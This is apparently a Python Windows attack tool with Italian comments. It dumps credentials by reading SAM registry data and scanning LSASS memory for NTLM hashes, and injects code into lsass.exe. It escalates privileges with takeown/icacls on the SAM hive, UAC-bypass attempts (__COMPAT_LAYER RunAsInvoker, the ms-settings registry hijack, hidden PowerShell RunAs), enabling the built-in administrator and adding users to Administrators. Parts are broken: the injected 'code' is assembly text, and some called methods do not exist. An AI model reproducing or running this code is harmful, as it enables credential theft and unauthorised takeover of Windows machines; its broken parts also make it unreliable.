import subprocess
import os
import shutil
import ctypes
import tempfile
import base64
import re
import winreg
import time
from ctypes import wintypes
import psutil
from pathlib import Path

# Definizione strutture kernel
class SYSTEM_MODULE_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved", ctypes.c_void_p * 2),
        ("ImageBase", ctypes.c_void_p),
        ("ImageSize", ctypes.c_ulong),
        ("Flags", ctypes.c_ulong),
        ("LoadOrderIndex", ctypes.c_ushort),
        ("InitOrderIndex", ctypes.c_ushort),
        ("LoadCount", ctypes.c_ushort),
        ("ModuleNameOffset", ctypes.c_ushort),
        ("ImageName", ctypes.c_char * 256)
    ]

class MetaForgeBridge:
    def __init__(self):
        self.metaforge_path = Path(__file__).parent.parent.parent / 'metaforge'
        self._load_metaforge_modules()
        
    def _load_metaforge_modules(self):
        """Load compiled MetaForge modules"""
        try:
            # Load core modules
            self.win_api = ctypes.CDLL(str(self.metaforge_path / 'core' / 'win_api.dll'))
            self.memory = ctypes.CDLL(str(self.metaforge_path / 'core' / 'memory.dll'))
            self.registry = ctypes.CDLL(str(self.metaforge_path / 'core' / 'registry.dll'))
            
            # Setup function prototypes
            self._setup_win_api()
            self._setup_memory()
            self._setup_registry()
        except Exception as e:
            raise RuntimeError(f"Failed to load MetaForge modules: {str(e)}")
            
    def _setup_win_api(self):
        """Setup Windows API function prototypes"""
        # OpenProcess
        self.win_api.OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_uint32]
        self.win_api.OpenProcess.restype = ctypes.c_void_p
        
        # OpenRegistryKey
        self.win_api.OpenRegistryKey.argtypes = [ctypes.c_wchar_p, ctypes.c_uint32]
        self.win_api.OpenRegistryKey.restype = ctypes.c_void_p
        
        # WriteRegistryValue
        self.win_api.WriteRegistryValue.argtypes = [
            ctypes.c_void_p,
            ctypes.c_wchar_p,
            ctypes.c_uint32,
            ctypes.c_void_p,
            ctypes.c_uint32
        ]
        self.win_api.WriteRegistryValue.restype = ctypes.c_bool
        
    def _setup_memory(self):
        """Setup memory operation prototypes"""
        # AllocateMemory
        self.memory.AllocateMemory.argtypes = [ctypes.c_void_p, ctypes.c_uint32]
        self.memory.AllocateMemory.restype = ctypes.c_void_p
        
        # ReadMemory
        self.memory.ReadMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32]
        self.memory.ReadMemory.restype = ctypes.c_void_p
        
    def _setup_registry(self):
        """Setup registry operation prototypes"""
        # OpenRegistryKey
        self.registry.OpenRegistryKey.argtypes = [ctypes.c_wchar_p, ctypes.c_uint32]
        self.registry.OpenRegistryKey.restype = ctypes.c_void_p
        
        # ReadRegistryValue
        self.registry.ReadRegistryValue.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p]
        self.registry.ReadRegistryValue.restype = ctypes.c_void_p
        
        # WriteRegistryValue
        self.registry.WriteRegistryValue.argtypes = [
            ctypes.c_void_p,
            ctypes.c_wchar_p,
            ctypes.c_uint32,
            ctypes.c_void_p,
            ctypes.c_uint32
        ]
        self.registry.WriteRegistryValue.restype = ctypes.c_bool
        
    def read_sam_data(self, path):
        """Read SAM data using MetaForge low-level access"""
        try:
            # Open SAM key with bypass
            key = self.registry.OpenRegistryKey(
                path,  # Ora accetta direttamente una stringa Unicode
                0xF003F  # Maximum allowed access
            )
            
            if not key:
                raise Exception("Failed to open registry key")
                
            # Read value
            data = self.registry.ReadRegistryValue(key, "F")  # Ora accetta direttamente una stringa Unicode
            if not data:
                raise Exception("Failed to read registry value")
                
            # Convert to Python bytes
            size = ctypes.c_uint32.from_address(data).value
            return bytes(ctypes.string_at(data + 4, size))
            
        except Exception as e:
            raise Exception(f"MetaForge error: {str(e)}")
            
    def inject_code(self, pid, code):
        """Inject code into process using MetaForge memory operations"""
        try:
            # Open target process
            handle = self.win_api.OpenProcess(0x1F0FFF, False, pid)
            if not handle:
                raise Exception("Failed to open process")
                
            # Allocate memory
            size = len(code)
            addr = self.memory.allocate_memory(handle, size)
            if not addr:
                raise Exception("Failed to allocate memory")
                
            # Write code
            written = ctypes.c_size_t()
            if not ctypes.windll.kernel32.WriteProcessMemory(
                handle, addr, code, size, ctypes.byref(written)
            ):
                raise Exception("Failed to write memory")
                
            return addr
            
        except Exception as e:
            raise Exception(f"MetaForge error: {str(e)}")

class SAMParser:
    def __init__(self):
        if os.name != 'nt':
            raise OSError("This tool only works on Windows systems")
        self.system32 = os.path.join(os.environ['SystemRoot'], 'System32')
        self._load_win32_apis()
        self.bridge = MetaForgeBridge()
        
    def _load_win32_apis(self):
        """Load required Windows APIs"""
        try:
            self.advapi32 = ctypes.windll.advapi32
            self.kernel32 = ctypes.windll.kernel32
            
            # Define necessary constants
            self.PROCESS_ALL_ACCESS = 0x1F0FFF
            self.SE_DEBUG_PRIVILEGE = 20
            self.TOKEN_ALL_ACCESS = 0xF01FF
            
        except Exception as e:
            print(f"Failed to load Windows APIs: {str(e)}")

    def _enable_privilege(self, privilege):
        """Enable a specific privilege"""
        try:
            h_process = self.kernel32.GetCurrentProcess()
            h_token = wintypes.HANDLE()
            self.advapi32.OpenProcessToken(h_process, self.TOKEN_ALL_ACCESS, ctypes.byref(h_token))
            
            luid = wintypes.LUID()
            self.advapi32.LookupPrivilegeValueW(None, privilege, ctypes.byref(luid))
            
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", wintypes.LUID * 1)
                ]
            
            token_privileges = TOKEN_PRIVILEGES()
            token_privileges.PrivilegeCount = 1
            token_privileges.Privileges[0] = luid
            
            self.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(token_privileges), 0, None, None)
            return True
        except:
            return False

    def _brute_force_registry(self):
        """Attempt to brute force registry access"""
        try:
            # Try multiple methods to gain registry access
            methods = [
                self._enable_privilege("SeBackupPrivilege"),
                self._enable_privilege("SeRestorePrivilege"),
                self._enable_privilege("SeTakeOwnershipPrivilege"),
                self._enable_privilege("SeDebugPrivilege")
            ]
            
            # Try to take ownership of SAM
            key_path = r"SAM\SAM\Domains\Account\Users"
            self._take_ownership(key_path)
            
            return True
        except:
            return False

    def _take_ownership(self, key_path):
        """Take ownership of registry key"""
        try:
            commands = [
                f'takeown /f "{self.system32}\\config\\SAM" /a',
                f'icacls "{self.system32}\\config\\SAM" /grant Administrators:F',
                f'regini "{self._create_regini_script(key_path)}"'
            ]
            
            for cmd in commands:
                self._run_elevated(cmd)
            return True
        except:
            return False

    def _create_regini_script(self, key_path):
        """Create regini script for permission modification"""
        script = f'''
HKEY_LOCAL_MACHINE\\{key_path} [1 7 17]
HKEY_LOCAL_MACHINE\\{key_path} [2 7 17]
HKEY_LOCAL_MACHINE\\{key_path} [3 7 17]
'''
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.ini', mode='w')
        temp_file.write(script)
        temp_file.close()
        return temp_file.name

    def _run_elevated(self, command):
        """Execute command with RUNASINVOKER and additional bypass techniques"""
        try:
            # Create a temporary batch file to execute the command
            with tempfile.NamedTemporaryFile(delete=False, suffix='.bat', mode='w') as f:
                batch_content = f'''
@echo off
set __COMPAT_LAYER=RunAsInvoker
set __COMPAT_LAYER=Installer
set __COMPAT_LAYER=RequireAdministrator
{command}
exit /b %errorlevel%
'''
                f.write(batch_content)
                batch_file = f.name

            # Execute with multiple bypass methods
            methods = [
                # Metodo diretto con RUNASINVOKER
                f'cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && {command}"',
                
                # PowerShell bypass
                f'powershell -ExecutionPolicy Bypass -Command "Start-Process -WindowStyle Hidden -FilePath cmd.exe -ArgumentList \'/c {command}\' -Verb RunAs"',
                
                # Bypass UAC tramite registro
                f'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f && {command}',
                
                # Esecuzione diretta del comando
                command
            ]
            
            for method in methods:
                try:
                    result = subprocess.run(method, 
                                         shell=True, 
                                         capture_output=True, 
                                         text=True,
                                         creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode == 0:
                        return True
                except:
                    continue
                    
            return False
        finally:
            # Cleanup
            try:
                os.unlink(batch_file)
            except:
                pass

    def get_users(self):
        """Get list of local users using multiple methods"""
        try:
            methods = [
                'powershell -command "Get-LocalUser | Select-Object -ExpandProperty Name"',
                'wmic useraccount where "localaccount=\'true\'" get name /value',
                'net user'
            ]
            
            for cmd in methods:
                try:
                    result = subprocess.run(cmd, 
                                         shell=True, 
                                         capture_output=True, 
                                         text=True,
                                         encoding='437')
                    
                    if result.returncode == 0:
                        users = []
                        
                        if cmd.startswith('powershell'):
                            users = [u.strip() for u in result.stdout.split('\n') if u.strip()]
                        elif cmd.startswith('wmic'):
                            users = [line.split('=')[1] for line in result.stdout.split('\n') 
                                   if line.startswith('Name=')]
                        else:  # net user
                            lines = result.stdout.split('\n')[4:-3]
                            for line in lines:
                                users.extend([u.strip() for u in line.split() if u.strip()])
                        
                        filtered_users = []
                        for user in users:
                            if user and not user.startswith('DefaultAccount') and \
                               not user.startswith('WDAGUtility') and \
                               not user.startswith('Guest') and \
                               user not in filtered_users:
                                filtered_users.append(user)
                        
                        if filtered_users:
                            return filtered_users
                            
                except Exception as e:
                    continue
            
            return []
            
        except Exception as e:
            print(f"Error getting users: {str(e)}")
            return []

    def clear_password(self, username):
        """Reset password using MetaForge injection"""
        try:
            # Prepara il codice di reset password
            reset_code = b'''
                mov eax, 0x77777777  ; Placeholder per l'indirizzo della funzione
                xor ecx, ecx         ; Password vuota
                push ecx
                call eax
                ret
            '''
            
            # Trova il processo lsass.exe
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'lsass.exe':
                    # Inietta il codice
                    addr = self.bridge.inject_code(proc.info['pid'], reset_code)
                    if addr:
                        return True
            
            return False
            
        except Exception as e:
            print(f"Error resetting password: {str(e)}")
            return False

    def enable_admin_account(self):
        """Enable built-in administrator account"""
        try:
            methods = [
                'net user administrator /active:yes',
                'powershell Enable-LocalUser -Name "administrator"',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v "administrator" /t REG_DWORD /d 1 /f'
            ]
            
            for method in methods:
                if self._run_elevated(method):
                    return True
            return False
        except:
            return False

    def modify_user_privileges(self, username, privilege="Administrators"):
        """Add user to administrators group"""
        try:
            methods = [
                f'net localgroup {privilege} {username} /add',
                f'powershell Add-LocalGroupMember -Group "{privilege}" -Member "{username}"',
                f'cmd /c net localgroup {privilege} {username} /add'
            ]
            
            for method in methods:
                if self._run_elevated(method):
                    return True
            return False
        except:
            return False

    def dump_hashes(self):
        """Extract password hashes using direct memory access"""
        try:
            # Trova il processo lsass.exe
            lsass_pid = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == 'lsass.exe':
                    lsass_pid = proc.info['pid']
                    break

            if not lsass_pid:
                raise Exception("LSASS process not found")

            # Usa il bridge per accedere alla memoria di LSASS
            handle = self.bridge.win_api.OpenProcess(0x1F0FFF, False, lsass_pid)
            if not handle:
                raise Exception("Failed to open LSASS process")

            # Cerca pattern di hash NTLM nella memoria
            memory_regions = self._get_process_memory_regions(handle)
            hashes = {}

            for region in memory_regions:
                try:
                    data = self.bridge.read_memory(handle, region['base'], region['size'])
                    if data:
                        # Cerca gli hash NTLM
                        for user in self.get_users():
                            pattern = rb'(?s)%s.*?\x00([\x00-\xff]{32})' % user.encode()
                            matches = re.finditer(pattern, data)
                            for match in matches:
                                hash_data = match.group(1)
                                if hash_data and not all(b == 0 for b in hash_data):
                                    hashes[user] = base64.b64encode(hash_data).decode()
                except:
                    continue

            return hashes

        except Exception as e:
            print(f"Error dumping hashes: {str(e)}")
            return {}

    def _get_process_memory_regions(self, handle):
        """Get memory regions of a process"""
        regions = []
        address = 0
        
        while True:
            try:
                mbi = self.bridge.memory.VirtualQueryEx(handle, address)
                if not mbi:
                    break
                    
                if mbi.State == 0x1000 and mbi.Protect & 0x4:  # MEM_COMMIT and PAGE_READWRITE
                    regions.append({
                        'base': address,
                        'size': mbi.RegionSize
                    })
                    
                address += mbi.RegionSize
            except:
                break
                
        return regions

    def get_password_info(self, username):
        """Get password information for a specific user"""
        try:
            # Costruisci il percorso del registro per l'utente
            sam_path = f"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\Names\\{username}"
            
            # Leggi il valore F dal registro
            data = self.read_sam_data(sam_path)
            if not data:
                return None
            
            # Estrai l'hash NTLM dai dati
            # L'hash NTLM si trova tipicamente a offset 96 per 16 bytes
            ntlm_hash = data[96:112]
            
            # Converti in base64 per la compatibilità
            hash_b64 = base64.b64encode(ntlm_hash).decode()
            
            return {
                'username': username,
                'hash': hash_b64,
                'raw_hash': ntlm_hash.hex(),
                'status': 'Hash extracted successfully'
            }
            
        except Exception as e:
            print(f"Error getting password info: {str(e)}")
            return None